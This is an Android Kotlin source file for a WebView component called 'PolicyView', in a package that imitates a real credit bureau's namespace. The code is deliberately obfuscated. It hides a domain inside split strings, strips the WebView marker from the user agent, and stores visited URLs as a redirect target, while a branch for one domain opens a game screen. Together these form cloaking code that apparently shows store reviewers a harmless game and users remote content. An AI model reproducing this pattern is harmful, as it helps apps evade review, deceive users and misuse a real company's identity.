package br.com.serasaexperian.consumido.ui.custom

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.ActivityResultLauncher
import br.com.serasaexperian.consumido.CandyJockerActivity
import br.com.serasaexperian.consumido.data.SImpl
import br.com.serasaexperian.consumido.domain.S
import br.com.serasaexperian.consumido.domain.SF

class PolicyView(
    private val context: Context,
    private val selectedFile: SF,
    private val candyJockerStorage: S

) : WebView(context) {

    @SuppressLint("SetJavaScriptEnabled")
    fun sta(activityResultLauncher: ActivityResultLauncher<String>){

        with(settings){
            javaScriptEnabled = true
            domStorageEnabled = true
            loadWithOverviewMode = false
            userAgentString = re(userAgentString) as String
        }

        webViewClient = nj() as WebViewClient
        webChromeClient = njk(activityResultLauncher) as WebChromeClient
    }


    private fun nj(): Any{
        return object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)

                if (url != null){
                    njsss(url)
                }
            }
        }
    }

    private fun njk(activityResultLauncher: ActivityResultLauncher<String>): Any{
        return object : WebChromeClient(){
            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                if (filePathCallback != null) {
                    selectedFile.onSelectImages(filePathCallback)
                    activityResultLauncher.launch(agentList[2])
                }

                return true
            }
        }
    }

    private fun njsss(destination: String){
        val original = agentList[3]+agentList[4]+agentList[5]+"z/"
        if (destination == original){
            //India, go to the menu
            njkxsjnkdd()
        } else {
            j(destination)
        }
    }

    private fun njkxsjnkdd() {
        candyJockerStorage.savePolicyDestination(SImpl.ViUViU)
        val intentToGoa = Intent(context, CandyJockerActivity::class.java)
        context.startActivity(intentToGoa)
    }


    private fun j(destination: String){
        val currentDestination = candyJockerStorage.readPolicyDestination()
        val original = agentList[3]+agentList[4]+agentList[5]

        if (currentDestination.startsWith(original) || currentDestination == SImpl.NO_POLICY ){
            //save link
            candyJockerStorage.savePolicyDestination(destination)
        }

    }

    private fun re(original: String) : Any{
        val elementsToReplace = agentList[0] + agentList[1]
        val empty = " "
        return original.replace(elementsToReplace, empty)
    }

    companion object{
        val agentList = listOf("w", "v", "image/*", "htt", "ps://cand", "yjoker.xy")
    }
}